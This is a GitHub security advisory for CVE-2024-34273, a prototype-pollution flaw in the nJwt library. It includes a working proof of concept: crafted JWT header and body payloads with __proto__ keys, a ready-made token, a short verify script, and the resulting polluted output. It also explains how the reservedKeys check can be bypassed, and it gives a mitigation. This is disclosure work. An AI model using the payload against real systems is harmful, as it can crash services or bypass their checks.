=== Content from github.com_fe463ce1_20250111_111611.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchrisandoryan%2Fvuln-advisory%2Fblob%2Fmain%2FnJwt%2FCVE-2024-34273.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchrisandoryan%2Fvuln-advisory%2Fblob%2Fmain%2FnJwt%2FCVE-2024-34273.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=chrisandoryan%2Fvuln-advisory)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[chrisandoryan](/chrisandoryan)
/
**[vuln-advisory](/chrisandoryan/vuln-advisory)**
Public

* [Notifications](/login?return_to=%2Fchrisandoryan%2Fvuln-advisory) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fchrisandoryan%2Fvuln-advisory)
* [Star
   1](/login?return_to=%2Fchrisandoryan%2Fvuln-advisory)

* [Code](/chrisandoryan/vuln-advisory)
* [Issues
  0](/chrisandoryan/vuln-advisory/issues)
* [Pull requests
  0](/chrisandoryan/vuln-advisory/pulls)
* [Actions](/chrisandoryan/vuln-advisory/actions)
* [Projects
  0](/chrisandoryan/vuln-advisory/projects)
* [Security](/chrisandoryan/vuln-advisory/security)
* [Insights](/chrisandoryan/vuln-advisory/pulse)

Additional navigation options

* [Code](/chrisandoryan/vuln-advisory)
* [Issues](/chrisandoryan/vuln-advisory/issues)
* [Pull requests](/chrisandoryan/vuln-advisory/pulls)
* [Actions](/chrisandoryan/vuln-advisory/actions)
* [Projects](/chrisandoryan/vuln-advisory/projects)
* [Security](/chrisandoryan/vuln-advisory/security)
* [Insights](/chrisandoryan/vuln-advisory/pulse)

## Files

 main
## Breadcrumbs

1. [vuln-advisory](/chrisandoryan/vuln-advisory/tree/main)
2. /[nJwt](/chrisandoryan/vuln-advisory/tree/main/nJwt)
/
# CVE-2024-34273.md

Copy path Blame  Blame
## Latest commit

## History

[History](/chrisandoryan/vuln-advisory/commits/main/nJwt/CVE-2024-34273.md)109 lines (88 loc) · 4.72 KB main
## Breadcrumbs

1. [vuln-advisory](/chrisandoryan/vuln-advisory/tree/main)
2. /[nJwt](/chrisandoryan/vuln-advisory/tree/main/nJwt)
/
# CVE-2024-34273.md

Top
## File metadata and controls

* Preview
* Code
* Blame

109 lines (88 loc) · 4.72 KB[Raw](https://github.com/chrisandoryan/vuln-advisory/raw/refs/heads/main/nJwt/CVE-2024-34273.md)
# Prototype Pollution in nJwt library

## Description

The nJwt library is susceptible to prototype pollution, particularly affecting the `JwtHeader` and `JwtBody` objects. These objects lack validation to ensure that attributes assigned to them don't resolve to the object prototype. The problem lies within the `Parser.prototype.parse` method, which is invoked when a user attempts to verify a JWT token using the `nJwt.verify(token, signingKey)` method.

By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object and its inheritance or bypass certain checks. This can be problematic if the software depends on the existence or non-existence of certain attributes, or uses pre-defined attributes of object prototype (such as `hasOwnProperty`, `toString`, or `valueOf`).

## Proof of Concept (PoC)

Create a new JWT token with `header` and `body` as follows:

JWT Header

```
{
  "typ": "JWT",
  "alg": "HS256",
  "__proto__": {
    "compact": null,
    "reservedKeys": ["typ", "random_gibberish"] // original: ["typ", "alg"]
  }
}

```

JWT Body

```
{
  "sub": 1,
  "scope": "user",
  "jti": "4cf58968-e553-4ebd-8d52-1407c654e8d6",
  "iat": 1713925867,
  "exp": 1713929467,
  "__proto__": {
    "compact": null,
    "toJSON": null,
    "polluted": true
  }
}

```

Resulting Token (Example)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsIl9fcHJvdG9fXyI6eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsIl9fcHJvdG9fXyI6eyJjb21wYWN0IjpudWxsLCJyZXNlcnZlZEtleXMiOlsidHlwIiwicmFuZG9tX2dpYmJlcmlzaCJdfX19.eyJzdWIiOjEsInNjb3BlIjoidXNlciIsImp0aSI6ImJhZmIxNmNlLTIwZDYtNGNkNy05NDgzLTY1YTA5NThhOGU2NCIsImlhdCI6MTcxMzk0NTM3OSwiZXhwIjoxNzEzOTQ4OTc5LCJfX3Byb3RvX18iOnsiY29tcGFjdCI6bnVsbCwidG9KU09OIjpudWxsLCJwb2xsdXRlZCI6dHJ1ZX19.0XBjesxGkSMBjI5_LrwobgoyG-VXI2HCXTGVU-fLFuk

```

Then, supply the token to be verified with `nJwt.verify()` function, for example:

```
// poc.js

var nJwt = require('njwt');

var secureRandom = require('secure-random');
var signingKey = secureRandom(256, {type: 'Buffer'});

var token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsIl9fcHJvdG9fXyI6eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsIl9fcHJvdG9fXyI6eyJjb21wYWN0IjpudWxsLCJyZXNlcnZlZEtleXMiOlsidHlwIiwicmFuZG9tX2dpYmJlcmlzaCJdfX19.eyJzdWIiOjEsInNjb3BlIjoidXNlciIsImp0aSI6ImJhZmIxNmNlLTIwZDYtNGNkNy05NDgzLTY1YTA5NThhOGU2NCIsImlhdCI6MTcxMzk0NTM3OSwiZXhwIjoxNzEzOTQ4OTc5LCJfX3Byb3RvX18iOnsiY29tcGFjdCI6bnVsbCwidG9KU09OIjpudWxsLCJwb2xsdXRlZCI6dHJ1ZX19.0XBjesxGkSMBjI5_LrwobgoyG-VXI2HCXTGVU-fLFuk";

nJwt.verify(token, signingKey);
```

As a result, the `JwtHeader` and `JwtBody` attributes will be polluted as follows:

JWT Header

```
[JWT Header] Attribute Before Pollution:  JwtHeader { typ: 'JWT', alg: 'HS256' }
[JWT Header] Prototype Before Pollution:  { reservedKeys: [ 'typ', 'alg' ], compact: [Function: compact] }

[JWT Header] Attribute After Pollution:  { typ: 'JWT', alg: 'HS256' }
[JWT Header] Prototype After Pollution:  { compact: null, reservedKeys: [ 'typ', 'random_gibberish' ] }

```

JWT Body

```
[JWT Body] Attribute Before Pollution:  JwtBody {}
[JWT Body] Prototype Before Pollution:  { toJSON: [Function (anonymous)], compact: [Function: compact] }

[JWT Body] Attribute After Pollution:  {
  sub: 1,
  scope: 'user',
  jti: 'bafb16ce-20d6-4cd7-9483-65a0958a8e64',
  iat: 1713945379,
  exp: 1713948979
}
[JWT Body] Prototype After Pollution:  { compact: null, toJSON: null, polluted: true }

```

## Impact

An arbitrary user can override existing attributes with ones that have incompatible types, which may lead to a crash, or bypass certain checks via attribute modification. It might also be possible to create polluted attributes on every object inheriting from `JwtBody` and `JwtHeader` objects.

For example, in `JwtHeader` object, there is a mechanism that prevents any additional attributes beyond the reserved keys (`typ` and `alg`) from being re-added by filtering them out during object instantiation:

```
function JwtHeader(header){
  // ...
  if(header){
    return Object.keys(header).reduce(function(acc,key){
      if(self.reservedKeys.indexOf(key)===-1 && header.hasOwnProperty(key)){ // can't re-assign 'typ' and 'alg' as they are in reservedKeys array.
        acc[key] = header[key];
      }
      return acc;
    },this);
  }else{
    return this;
  }
}
JwtHeader.prototype.reservedKeys = ['typ','alg'];

```

However, as we can modify the `JwtHeader.prototype.reservedKeys` prototype attribute and practically inserting any value into the array, we can bypass such checks.

## Mitigation

This issue can be fixed by freezing the prototype, or by implementing validation to check for prototype keywords (`__proto__`, `constructor` and `prototype`), where if it exists, the function denies merging it into `JwtBody` and `JwtHeader` object, thus preventing the prototype pollution vulnerability.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


